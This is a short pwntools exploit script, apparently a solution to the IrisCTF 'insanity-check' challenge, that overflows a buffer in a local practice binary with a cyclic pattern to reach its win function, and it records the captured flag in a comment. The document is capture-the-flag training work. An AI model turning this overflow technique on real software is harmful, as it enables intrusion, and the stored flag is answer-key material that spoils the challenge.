#!/usr/bin/env python3

import pwn
import time
import warnings

warnings.filterwarnings(action='ignore', category=BytesWarning)


elf = pwn.ELF("./vuln")
pwn.context.binary = elf
pwn.context.log_level = "DEBUG"
pwn.context(terminal=['tmux', 'split-window', '-h'])

libc = elf.libc

sym_main = elf.symbols['main']
sym_win = elf.symbols['win']
dis_main = elf.disasm(elf.symbols['main'], 12) 
dis_win = elf.disasm(elf.symbols['win'], 12) 
print("%#x -> main()" % sym_main)
print(dis_main)
print("%#x -> win()" % sym_win)
print(dis_win)
# print( "%#x -> list_all_jobs" % elf.functions['win'].address)

#p = pwn.remote("insanity-check.chal.irisc.tf", "10003")
p = elf.process()
pwn.gdb.attach(p)

# p.sendline(pwn.cyclic(63))
p.sendline(pwn.cyclic(63-7))
p.recvline()
p.interactive()



# irisctf{c0nv3n13nt_symb0l_pl4cem3nt}

